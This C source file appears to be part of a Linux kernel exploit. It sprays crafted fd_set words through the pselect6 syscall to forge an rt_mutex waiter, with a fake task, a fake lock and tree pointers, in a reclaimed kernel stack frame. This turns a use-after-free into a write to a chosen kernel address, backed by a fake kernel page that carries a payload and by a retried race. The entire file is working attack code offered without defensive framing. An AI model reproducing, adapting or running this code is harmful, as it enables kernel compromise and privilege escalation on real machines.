#include "common.h"

#define PSELECT_ROUTE_ATTEMPTS 8

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

int pselect_stack_uses_result_sets(int shift, int last_waiter_word) {
  return shift + last_waiter_word >= 3 * pselect_words_per_set();
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = PSELECT_WAITER_WORD_SHIFT + waiter_word;
  int input_words = 3 * words_per_set;

  /*
   * core_sys_select stores three input fd sets followed by three result sets.
   * For a waiter that starts beyond the input area, seed the corresponding
   * input word and use descriptors that are ready in all three classes.  The
   * result copy then materializes the requested word at global_word.
   */
  if (global_word >= input_words && global_word < 2 * input_words) {
    global_word -= input_words;
  }
  if (!pselect_put_global_word(
          in, out, ex, words_per_set, global_word, value)) {
    pr_error("pselect cannot place %s waiter_word=%d global_word=%d\n",
             name, waiter_word, global_word);
  }
}

static int make_ready_all_socket_pair(int *ready_fd, int *peer_fd) {
  int sockets[2] = {-1, -1};
  int ready_high = -1;
  int peer_high = -1;
  int saved_errno = 0;
  char normal = 'N';
  char urgent = 'U';

  if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sockets) != 0 ||
      send(sockets[1], &normal, sizeof(normal), MSG_NOSIGNAL) !=
          (ssize_t)sizeof(normal) ||
      send(sockets[1], &urgent, sizeof(urgent), MSG_OOB | MSG_NOSIGNAL) !=
          (ssize_t)sizeof(urgent)) {
    goto fail;
  }

  ready_high = fcntl(sockets[0], F_DUPFD, PSELECT_ROUTE_NFDS + 64);
  peer_high = fcntl(sockets[1], F_DUPFD, PSELECT_ROUTE_NFDS + 65);
  if (ready_high < 0 || peer_high < 0) {
    goto fail;
  }

  close(sockets[0]);
  close(sockets[1]);
  *ready_fd = ready_high;
  *peer_fd = peer_high;
  return 1;

fail:
  saved_errno = errno;
  if (ready_high >= 0) {
    close(ready_high);
  }
  if (peer_high >= 0) {
    close(peer_high);
  }
  if (sockets[0] >= 0) {
    close(sockets[0]);
  }
  if (sockets[1] >= 0) {
    close(sockets[1]);
  }
  errno = saved_errno;
  return 0;
}

int open_ready_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int *ready_fd, int *peer_fd) {
  int ready = -1;
  int peer = -1;

  if (!make_ready_all_socket_pair(&ready, &peer)) {
    return 0;
  }

  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if ((FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) &&
        dup2(ready, fd) < 0) {
      int saved_errno = errno;
      close(ready);
      close(peer);
      errno = saved_errno;
      return 0;
    }
  }

  *ready_fd = ready;
  *peer_fd = peer;
  return 1;
}

int pselect_fdsets_match(
    const fd_set *expected_in, const fd_set *expected_out,
    const fd_set *expected_ex, const fd_set *actual_in,
    const fd_set *actual_out, const fd_set *actual_ex) {
  size_t bytes = (size_t)pselect_words_per_set() * sizeof(unsigned long);
  return memcmp(expected_in, actual_in, bytes) == 0 &&
         memcmp(expected_out, actual_out, bytes) == 0 &&
         memcmp(expected_ex, actual_ex, bytes) == 0;
}

static void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_error("pselect F_DUPFD read errno=%d\n", errno);
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      SYSCHK(dup2(high_read, fd));
    }
  }
  close(high_read);
  SYSCHK(dup2(read_fd, PSELECT_ROUTE_NFDS - 1));
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

static void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  uintptr_t target = pselect_write_target();
  uintptr_t value = pselect_write_value();
  uintptr_t parent = value;
  uintptr_t right = 0;
  uintptr_t left = target;

  if (pselect_write_shape() == 1) {
    if (target < 8) {
      pr_error("shape1 target underflow target=%016zx\n", target);
    }
    parent = target - 8;
    right = value;
    left = 0;
  }

  struct waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {0, parent, "tree_parent"},
    {1, right, "tree_right"},
    {2, left, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {4, 0, "tree_deadline"},
    {5, parent, "pi_parent"},
    {6, right, "pi_right"},
    {7, left, "pi_left"},
    {8, FAKE_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
    {10, fake_task, "task"},
    {11, fake_lock, "lock"},
    {12, 3, "wake_state"},
    {13, 0, "ww_ctx"},
  };

  int words_per_set = pselect_words_per_set();
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    pselect_put_waiter_word(
        in, out, ex, words_per_set, words[i].word,
        words[i].value, words[i].name);
  }
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_task) {
    pr_error("pselect route missing page=%016zx lock=%016zx task=%016zx\n",
             page_base, fake_lock, fake_task);
  }

  for (int attempt = 1; attempt <= PSELECT_ROUTE_ATTEMPTS; attempt++) {
    if (attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_task) {
        pr_error("pselect retry page prepare failed attempt=%d\n", attempt);
      }
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    fd_set expected_in = in;
    fd_set expected_out = out;
    fd_set expected_ex = ex;
    int use_results = pselect_stack_uses_result_sets(
        PSELECT_WAITER_WORD_SHIFT, 13);
    int pipefd[2] = {-1, -1};
    int block_fd = -1;
    int high_read = -1;
    int ready_fd = -1;
    int peer_fd = -1;

    if (use_results) {
      if (!open_ready_selected_fds(
              &in, &out, &ex, &ready_fd, &peer_fd)) {
        pr_error("pselect ready-fd setup failed errno=%d\n", errno);
      }
    } else {
      SYSCHK(pipe(pipefd));
      block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
      if (block_fd < 0) {
        block_fd = pipefd[0];
      }
      high_read = SYSCHK(fcntl(
          block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16));
      open_selected_fds(&in, &out, &ex, high_read);
    }

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&main_route_delay_usec, 0);
    struct timespec timeout = {
      .tv_sec = use_results ? 0 : PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    struct timespec *timeoutp = use_results ? NULL : &timeout;
    if (!use_results) {
      atomic_store(&punch_consume_go, attempt);
    }
    errno = 0;
    int ret = (int)syscall(
        SYS_pselect6, PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;

    /*
     * The reclaimed waiter lives in a completed syscall's stack frame.  Wake
     * the consumer before doing even the diagnostic fd-set comparison: under
     * TCG that comparison was enough extra latency for a later stack user to
     * clear waiter->lock intermittently.
     */
    if (use_results && ret >= 0) {
      atomic_store(&punch_consume_go, attempt);
      while (atomic_load(&punch_consume_go) == attempt) {
        __asm__ volatile("yield" ::: "memory");
      }
    } else {
      atomic_store(&punch_consume_go, 0);
    }

    int sets_match = !use_results || pselect_fdsets_match(
        &expected_in, &expected_out, &expected_ex, &in, &out, &ex);

    int calls = atomic_load(&consumer_calls);
    int success = atomic_load(&consumer_success);
    pr_info("pselect attempt=%d ret=%d errno=%d result_mode=%d "
            "sets_match=%d calls=%d success=%d\n",
            attempt, ret, saved_errno, use_results, sets_match, calls, success);

    if (high_read >= 0) {
      close(high_read);
    }
    if (block_fd >= 0 && block_fd != pipefd[0]) {
      close(block_fd);
    }
    if (pipefd[0] >= 0) {
      close(pipefd[0]);
    }
    if (pipefd[1] >= 0) {
      close(pipefd[1]);
    }
    if (ready_fd >= 0) {
      close(ready_fd);
    }
    if (peer_fd >= 0) {
      close(peer_fd);
    }

    if (calls > 0 && success > 0) {
      return;
    }
  }

  pr_error("pselect route exhausted\n");
}
